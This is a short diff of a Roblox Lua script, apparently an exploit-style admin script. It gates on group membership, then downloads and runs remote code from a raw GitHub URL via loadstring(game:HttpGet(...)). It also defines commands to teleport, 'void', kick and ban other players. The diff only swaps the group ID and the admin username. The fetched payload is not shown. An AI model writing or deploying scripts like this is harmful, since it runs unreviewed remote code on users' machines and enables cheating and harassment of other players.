@@ -1,9 +1,9 @@
 local plr = game:GetService("Players").LocalPlayer
-if plr:IsInGroup("12096344") then
+if plr:IsInGroup("12461136") then
 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/epicgamersoocool123/test/main/123123123123123"))()
     
-    local admins = {"2hot4gizem"}
+    local admins = {"hellofarzad125"}
     local commands = {"tp","usingsilent","void","kick,ban"}
     local prefix = ";"
     
